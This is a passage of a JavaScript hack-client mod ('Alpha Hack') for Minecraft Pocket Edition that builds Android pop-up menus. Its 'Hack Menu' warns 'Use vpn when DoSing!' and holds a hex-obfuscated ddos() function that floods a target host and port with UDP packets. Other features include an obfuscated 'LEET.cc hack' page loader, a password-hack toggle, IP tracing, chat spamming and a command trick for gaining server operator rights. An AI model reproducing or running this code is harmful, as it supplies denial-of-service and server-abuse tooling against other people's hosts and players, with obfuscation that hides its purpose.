       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		lmenuLayout.addView(MainTitle);

var credit2 = new android.widget.TextView(ctx); credit2.setGravity(android.view.Gravity.CENTER);
		credit2.setText("Made by: Arceus_matt");
       credit2.setTextColor(GUIName);
		credit2.setTextSize(20);
		lmenuLayout.addView(credit2);
            
            var title = new android.widget.TextView(ctx); title.setGravity(android.view.Gravity.CENTER);
		title.setText("Special thanks to:");
       title.setTextColor(GUIName);
		title.setTextSize(20);
		lmenuLayout.addView(title);

 var credit1 = new android.widget.TextView(ctx); credit1.setGravity(android.view.Gravity.CENTER);
	 credit1.setText("Godsoft029 for code!");
       credit1.setTextColor(GUIName);
		credit1.setTextSize(20);
		lmenuLayout.addView(credit1);

var exit = new android.widget.Button(ctx);
		exit.setText("Exit");
		exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             lmenu.dismiss();
showMenuBtn();
			}
		});
		lmenuLayout.addView(exit);

var pa = new android.widget.Button(ctx);
		pa.setText("Restart script");
		pa.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){ 
 net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, true);

net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, false);
			}
		});
		lmenuLayout.addView(pa);

var up = new android.widget.Button(ctx);
		up.setText("Check for update");
		up.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){ 
checkVersion(); 
			}
		});
		lmenuLayout.addView(up);

var ab = new android.widget.Button(ctx);
		ab.setText("About mod");
		ab.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
var alert = new android.app.AlertDialog.Builder(ctx); 
alert.setTitle("About Alphα Hαck"); 

var scroll = new android.widget.ScrollView(ctx); 
var layout = new android.widget.LinearLayout(ctx); 
layout.setOrientation(1);

alert.setTitle("About Alphα Hαck");
 alert.setMessage("Alpha Hack was originally inspired by many other mods in mcpe 0.12\nMods inspiration: GhostHack.js, ServiceHack.js, TooManyItems.js.\nPeople wanted me to bring it back so i did\nAlpha hack today is much more powerful\nI hope you enjoy all its features like i do\nThanks for downloading\nSpecial thanks to: godsoft029 for some script\nThanks to: ALLMCPE for telling me to make this mod again.\n\nHow to use it: Simply open a menu and click a button then you will begin to use its features!\n\nYou can change GUI color in settings\nIf anything goes wrong click restart script in settings\n\nUSE HACK MENU AT YOUR OWN RISK.\nPlease do not copy this mod or steal script.\n\nGerman translation: Godsoft029,\nKorean translation: johnmacrocraft,\nSpanish translation: walpo\nJapanese translation: Not done yet");

alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
  onClick: function(viewarg){
    
dialog.dismiss();
lmenu.dismiss();
      }});

alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
   onClick: function(viewarg){
 
dialog.dismiss();
      }});
var dialog = alert.create();
dialog.show();
			}
		});
		lmenuLayout.addView(ab)

var cl = new android.widget.Button(ctx);
		cl.setText(version + space + "Changelog");
		cl.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
var alert = new android.app.AlertDialog.Builder(ctx); 
alert.setTitle("Alphα Hαck" + space + version + space + "changelog"); 

var scroll = new android.widget.ScrollView(ctx); 
var layout = new android.widget.LinearLayout(ctx); 
layout.setOrientation(1);

alert.setTitle("Alphα Hαck" + space + version + space + "changelog");
 alert.setMessage(version + space + "Changelog:" + "\nAdded Japanese translation, added entity spawner, always improving.");

alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
  onClick: function(viewarg){
    
dialog.dismiss();
lmenu.dismiss();
      }});

alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
   onClick: function(viewarg){

dialog.dismiss();
      }});
var dialog = alert.create();
dialog.show();
			}
		});
		lmenuLayout.addView(cl);

var dl = new android.widget.Button(ctx);
		dl.setText("Download link");
		dl.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){ 
var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=1"));
                    ctx.startActivity(urls);
			}
		});
		lmenuLayout.addView(dl);

var g1 = new Button(ctx);
            g1.setText("Menu Center");       
            g1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIPos = Gravity.CENTER;
GUIPos2 = Gravity.CENTER;
GUIPos3 = Gravity.CENTER;
                }
            }));
            lmenuLayout.addView(g1);

var g2 = new Button(ctx);
            g2.setText("Menu Right");       
            g2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIPos = Gravity.RIGHT;
GUIPos2 = Gravity.RIGHT;
GUIPos3 = Gravity.RIGHT;
                }
            }));
            lmenuLayout.addView(g2);

var g3 = new Button(ctx);
            g3.setText("Menu Left");       
            g3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIPos = Gravity.LEFT;
GUIPos2 = Gravity.LEFT;
GUIPos3 = Gravity.LEFT;
                }
            }));
            lmenuLayout.addView(g3);

var l1 = new Button(ctx);
            l1.setText("Transparent Menu");       
            l1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor1
var GUIName = Color.WHITE;
                }
            }));
            lmenuLayout.addView(l1);
            
            var l2 = new Button(ctx);
            l2.setText("Black Menu");       
            l2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor2
 var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l2);

var l3 = new Button(ctx);
            l3.setText("White Menu");       
            l3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor3
var GUIName = Color.BLACK
                }
            }));
            lmenuLayout.addView(l3);

var l4 = new Button(ctx);
            l4.setText("Red Menu");       
            l4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor4
                }
            }));
            lmenuLayout.addView(l4);

var l5 = new Button(ctx);
            l5.setText("Blue Menu");       
            l5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor5
                }
            }));
            lmenuLayout.addView(l5);

var l6 = new Button(ctx);
            l6.setText("Gray Menu");       
            l6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor6
var GUIName = Color.WHITE;
                }
            }));
            lmenuLayout.addView(l6);

var l7 = new Button(ctx);
            l7.setText("Light gray Menu");       
            l7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor7
var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l7);

var l8 = new Button(ctx);
            l8.setText("Yellow Menu");       
            l8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor8
var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l8);

var l9 = new Button(ctx);
            l9.setText("Cyan Menu");       
            l9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor9
var GUIName = Color.BLACK;
                }
            }));
            lmenuLayout.addView(l9);

var l10 = new Button(ctx);
            l10.setText("Dark gray Menu");       
            l10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor10
var GUIName = Color.WHITE
                }
            }));
            lmenuLayout.addView(l10);

var l11 = new Button(ctx);
            l11.setText("Green Menu");       
            l11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor11
                }
            }));
            lmenuLayout.addView(l11);

var l12 = new Button(ctx);
            l12.setText("Magenta Menu");       
            l12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
GUIColor = GUIColor12
                }
            }));
            lmenuLayout.addView(l12);
		
		var exit2 = new android.widget.Button(ctx);
		exit2.setText("Exit");
		exit2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             lmenu.dismiss();
showMenuBtn();
			}
		});
		lmenuLayout.addView(exit2);

            lmenu = new PopupWindow(lmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            lmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            lmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

/*function exit(){
    ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var xLayout = new LinearLayout(ctx);
            var xButton = new Button(ctx);
            xButton.setText('X');
            xButton.setTextColor(Color.RED);
            xButton.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    exitUI.dismiss();
                    menu.dismiss();
header.dismiss(); 
print("Closed successfully");
showMenuBtn();
                }
            }));
            xLayout.addView(xButton);
 
            exitUI = new PopupWindow(xLayout, dip2px(45), dip2px(45));
            exitUI.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            exitUI.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 195, 0);
            }catch(exception){
                Toast.makeText(ctx, exception, 1).show();
            }
    }}));
}*/

function cmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var cmenuLayout = new LinearLayout(ctx);
            var cmenuScroll = new ScrollView(ctx);
            var cmenuLayout1 = new LinearLayout(ctx);
            cmenuLayout.setOrientation(1);
            cmenuLayout1.setOrientation(1);
            cmenuScroll.addView(cmenuLayout);
            cmenuLayout1.addView(cmenuScroll);
            
var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		cmenuLayout.addView(MainTitle);

            var q2title = new android.widget.TextView(ctx); q2title.setGravity(android.view.Gravity.CENTER);
		q2title.setText("Hack Menu");
       q2title.setTextColor(GUIName);
		q2title.setTextSize(20);
		cmenuLayout.addView(q2title);

var q3title = new android.widget.TextView(ctx);
q3title.setGravity(android.view.Gravity.CENTER);
q3title.setText("Use At Your Own Risk!\nThis menu has illegal tools! Use vpn when DoSing!\n");
q3title.setTextColor(Color.RED);
q3title.setTextSize(25);
cmenuLayout.addView(q3title);

var exitb = new android.widget.Button(ctx);
		exitb.setText("Exit");
		exitb.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             cmenu.dismiss();
showMenuBtn();
			}
		});
		cmenuLayout.addView(exitb);

var _0x63b6=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddos(_0xf2e3x2,_0xf2e3x3,_0xf2e3x4){var _0xf2e3x5= new java[_0x63b6[9]].Runnable({run:function(){try{for(var _0xf2e3x6=0;_0xf2e3x6<=_0xf2e3x4;_0xf2e3x6++){var _0xf2e3x7= new java[_0x63b6[0]].DatagramSocket();var _0xf2e3x8= new byte[2024];_0xf2e3x8=_0x63b6[3].toString()[_0x63b6[2]](_0x63b6[1]);_0xf2e3x7[_0x63b6[7]]( new java[_0x63b6[0]].DatagramPacket(_0xf2e3x8,_0xf2e3x8[_0x63b6[4]],java[_0x63b6[0]][_0x63b6[6]][_0x63b6[5]](_0xf2e3x2),_0xf2e3x3));_0xf2e3x7[_0x63b6[8]]()}}catch(e){print(e)}}});var _0xf2e3x9= new java[_0x63b6[9]].Thread(_0xf2e3x5);_0xf2e3x9[_0x63b6[10]]()}

var hackpass = new android.widget.Button(ctx);
            hackpass.setText("Hack password: "+(hackk?"on":"off"));
            hackpass.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
                hackk?hackk=false:hackk=true;
hackpass.setText("Hack password: "+(hackk?"on":"off"));
                }
            }));
            cmenuLayout.addView(hackpass);

var leet = new android.widget.Button(ctx);
            leet.setText("LEET.cc hack");
            leet.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
cmenu.dismiss();
ids();
                }
            }));
            cmenuLayout.addView(leet);

function ids() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
ids = new android.widget.PopupWindow();
var Layer3 = new android.widget.LinearLayout(ctx);
var ID = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter support ID");
Dialog.setContentView(Layer3);

Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer3.addView(ID);
Layer3.addView(Exit);

ID.setText("");
ID.setHint("Support ID");
Exit.setText("GET info");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
end =ID.getText();
Dialog.dismiss();
pee();
print("Loading web page");
showMenuBtn();
}
});

ids.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
ids.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
ids.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The LEET Dialog Is Malfunctioning:"+e);
}
}});
}

      var _0x9c2d=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x73\x65\x72\x76\x65\x72\x4E\x65\x77\x2E\x70\x68\x70\x3F\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee(){ctx[_0x9c2d[12]]( new java[_0x9c2d[11]].Runnable({run:function(){var _0x369dx2= new android[_0x9c2d[0]].WebView(ctx);var _0x369dx3=_0x369dx2[_0x9c2d[1]]();_0x369dx3[_0x9c2d[2]](true);_0x369dx2[_0x9c2d[3]]( new android[_0x9c2d[0]].WebChromeClient());_0x369dx2[_0x9c2d[4]]( new android[_0x9c2d[0]].WebViewClient());_0x369dx2[_0x9c2d[6]](_0x9c2d[5]+end); new android[_0x9c2d[10]][_0x9c2d[9]].Builder(ctx)[_0x9c2d[8]](_0x369dx2)[_0x9c2d[7]]()}}))}

var svr = new android.widget.Button(ctx);
            svr.setText("Server IP & Port");
            svr.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
clientMessage(client + "§lIP:§r " + Server.getAddress() + " §lPort:§r " + Server.getPort());
                }
            }));
            cmenuLayout.addView(svr);

var yrip = new android.widget.Button(ctx);
            yrip.setText("What's my IP?");
            yrip.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
getIp(function(info){clientMessage(client + "\n" + "External IP: " + info[0] + "\nCountry: "+info[1]+ "\nRegion: "+info[2])})
getIp(function(info){print("IP: " + info[0])})
                }
            }));
            cmenuLayout.addView(yrip);

var ip0 = new android.widget.Button(ctx);
            ip0.setText("IP lookup");
            ip0.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
cmenu.dismiss();
iplu();
                }
            }));
            cmenuLayout.addView(ip0);

function iplu() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
iplu = new android.widget.PopupWindow();
var Layer4 = new android.widget.LinearLayout(ctx);
var ip1 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter IP to trace");
Dialog.setContentView(Layer4);

Layer4.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer4.addView(ip1);
Layer4.addView(Exit);

ip1.setText("");
ip1.setHint("IP address");
Exit.setText("Trace");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
ip =ip1.getText();
Dialog.dismiss();
ip2();
print("Loading web page");
showMenuBtn();
}
});

iplu.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
iplu.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
iplu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The IPLU Dialog Is Malfunctioning:"+e);
}
}});
}

      function ip2()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://ip-api.com/json/' + ip);
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var opp = new Button(ctx);
            opp.setText("OP permission");        
            opp.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){ 
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/setuperm " + Player.getName(Player.getEntity()) + space + operm);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/setuperm " + Player.getName(Player.getEntity()) + space + operm2);
clientMessage(client + "§7You now have OP permissions, (gives you permanent op if you were op before, if server closes you can op yourself instead of losing it after server closes.)");
                }
            }));
            cmenuLayout.addView(opp);

var sit = new android.widget.Button(ctx);
		sit.setText("Image lookup");
		sit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
web3(); 
print("Loading web page");
			}
		});
		cmenuLayout.addView(sit);

      function web3()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://www.tineye.com');
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var sid = new android.widget.Button(ctx);
		sid.setText("View website code");
		sid.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
cmenu.dismiss();
             scc();
			}
		});
		cmenuLayout.addView(sid);

function scc() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
scc = new android.widget.PopupWindow();
var Layer5 = new android.widget.LinearLayout(ctx);
var sc1 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter website");
Dialog.setContentView(Layer5);

Layer5.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer5.addView(sc1);
Layer5.addView(Exit);

sc1.setText("");
sc1.setHint("www.example.com");
Exit.setText("View code");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
sc2 =sc1.getText();
Dialog.dismiss();
sc3();
print("Loading web page");
showMenuBtn();
}
});

scc.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
scc.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
scc.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The scc Dialog Is Malfunctioning:"+e);
}
}});
}

      function sc3()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://www.iwebtool.com/code_viewer?domain=' + sc2);
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var wb = new android.widget.Button(ctx);
		wb.setText("Web browser");
		wb.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
lmenu.dismiss();
             wb1();
			}
		});
		cmenuLayout.addView(wb);

function wb1() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
wb1 = new android.widget.PopupWindow();
var Layer1 = new android.widget.LinearLayout(ctx);
var wb2 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter website");
Dialog.setContentView(Layer1);

Layer1.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer1.addView(wb2);
Layer1.addView(Exit);

wb2.setText("");
wb2.setHint("https://www.example.com");
Exit.setText("Go to site");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
wb3 =wb2.getText();
Dialog.dismiss();
wb4();
print("Loading web page");
showMenuBtn();
}
});

wb1.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
wb1.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
wb1.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The wb Dialog Is Malfunctioning:"+e);
}
}});
}

      function wb4()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('' + wb3);
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

		var exitb2 = new android.widget.Button(ctx);
		exitb2.setText("Exit");
	   exitb2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             cmenu.dismiss();
showMenuBtn();
			}
		});
		cmenuLayout.addView(exitb2);

            cmenu = new PopupWindow(cmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            cmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            cmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function zmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var zmenuLayout = new LinearLayout(ctx);
            var zmenuScroll = new ScrollView(ctx);
            var zmenuLayout1 = new LinearLayout(ctx);
            zmenuLayout.setOrientation(1);
            zmenuLayout1.setOrientation(1);
            zmenuScroll.addView(zmenuLayout);
            zmenuLayout1.addView(zmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		zmenuLayout.addView(MainTitle);
            
            var T_title = new android.widget.TextView(ctx); T_title.setGravity(android.view.Gravity.CENTER);
		T_title.setText("ModPE Menu");
       T_title.setTextColor(GUIName);
		T_title.setTextSize(20);
		zmenuLayout.addView(T_title);

var A_exit = new android.widget.Button(ctx);
		A_exit.setText("Exit");
		A_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             zmenu.dismiss();
showMenuBtn();
			}
		});
		zmenuLayout.addView(A_exit);

var zmenuDot = new android.widget.LinearLayout(ctx);
	 zmenuDot.setOrientation(0);
var editab = new android.widget.EditText(ctx);
editab.setHint("Spammer");
editab.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
spa(); 
			}
		});
     var switched = false;
      var button = new android.widget.Switch(ctx);
      button.setChecked(switched);
      button.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
      onCheckedChanged: function(){
      if(!switched){
      switched = true;

sspam = true;
print("yes");

      }else{
      switched = false;

 sspam = false;
print("no");

      }
      button.setChecked(switched);
      }
      }));
     
      zmenuDot.addView(editab);
     zmenuDot.addView(button);

zmenuLayout.addView(zmenuDot);

function spa() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
spa = new android.widget.PopupWindow();
var Layer6 = new android.widget.LinearLayout(ctx);
var mm = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter text for spam");
Dialog.setContentView(Layer6);

Layer6.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer6.addView(mm);
Layer6.addView(Exit);

mm.setText("AlphaHack!");
Exit.setText("done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
text =mm.getText();
Dialog.dismiss();
}
});

spa.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
spa.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
spa.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Spam Dialog Is Malfunctioning:"+e);
}
}});
}

var cs = new Button(ctx);
            cs.setText("Sign editor");        
            cs.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    clientMessage(client + "§7This is already enabled, tap a sign!");
print("§7This is already enabled, tap a sign!");
                }
            }));
            zmenuLayout.addView(cs);

var ray = new android.widget.Button(ctx);
      ray.setText("X-ray: "+(xxray?"on":"off"));
		ray.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         xxray?xxray=false:xxray=true;
ray.setText("X-ray: "+(xxray?"on":"off"));
if(xxray == true){
clientMessage(client + "§7X-ray is on");
Block.setRenderLayer(1,1);

Block.setRenderLayer(2,1);

Block.setRenderLayer(3,1);

Block.setRenderLayer(12,1);

Block.setRenderLayer(24,1);

Block.setRenderLayer(78,1);
xxray = true;
}
if(xxray == false){
clientMessage(client + "§7X-ray is off");
Block.setRenderLayer(1,num0);

Block.setRenderLayer(2,num0);

Block.setRenderLayer(3,num0);

Block.setRenderLayer(12,num0);

Block.setRenderLayer(24,num0);

Block.setRenderLayer(78,num0);
xxray = false;
                }
			}
		});
		zmenuLayout.addView(ray);

var status = new android.widget.Button(ctx);
      status.setText("MC Status: "+(stat22?"on":"off"));
		status.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         stat22?stat22=false:stat22=true;
status.setText("MC Status: "+(stat22?"on":"off"));
if(stat22 == true){
clientMessage("§7Status on");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/hud off");
clientMessage(client + "§7T = time, W = weather, B = biome, ID = item id, G = gamemode.");
stat22 = true;
}
if(stat22 == false){
clientMessage("§7Status off");

stat22 = false;
                }
			}
		});
		zmenuLayout.addView(status);

var creative = new Button(ctx);
            creative.setText("Creative");        
            creative.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.setGameMode(1);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 1");
clientMessage(client + "§7Your gamemode was updated to creative mode!");
                }
            }));
            zmenuLayout.addView(creative);
 
            var survival = new Button(ctx);
            survival.setText("Survival");        
            survival.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.setGameMode(0);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 0");
clientMessage(client + "§7Your gamemode was updated to survival mode!");
                }
            }));
            zmenuLayout.addView(survival);

var es = new Button(ctx);
            es.setText("Entity spawner");        
            es.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    enter(); 
                }
            }));
            zmenuLayout.addView(es);

function enter(){
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
var enterLayout = new android.widget.LinearLayout(ctx);
 
enterLayout.setGravity(android.view.Gravity.RIGHT);
enterLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
var dot = android.widget.TextView(ctx);
var oneBtn = android.widget.Button(ctx);
var twoBtn = android.widget.Button(ctx);
var treeBtn = android.widget.Button(ctx);
var fourBtn = android.widget.Button(ctx);
var fiveBtn = android.widget.Button(ctx);
var cBtn = android.widget.Button(ctx);
dot.setTextSize(15);
oneBtn.setText("Lightning");
twoBtn.setText("PrimedTnt");
treeBtn.setText("Arrow");
fourBtn.setText("Exp orb");
fiveBtn.setText("Minecart");
 
cBtn.setText("Cancel");
var enterDialog = new android.app.Dialog(ctx);
enterDialog.show();
enterDialog.setContentView(enterLayout);
enterDialog.setTitle("Tap to select");
  
 
enterLayout.addView(dot);
enterLayout.addView(oneBtn);
enterLayout.addView(twoBtn);
enterLayout.addView(treeBtn);
enterLayout.addView(fourBtn);
enterLayout.addView(fiveBtn);
enterLayout.addView(cBtn);
 
oneBtn.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(viewarg){
 
lightning = true;
if(primedtnt==true)primedtnt = false;
if(arrow==true)arrow = false;
if(exporb==true)exporb = false;
 
enterDialog.dismiss();
clientMessage("Tap ground to spawn entity");
}});
 
twoBtn.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(viewarg){
 
primedtnt = true;
if(lightning==true)lightning = false;
if(arrow==true)arrow = false;
if(exporb==true)exporb = false;
 
enterDialog.dismiss();
clientMessage("Tap ground to spawn entity");
}});
 
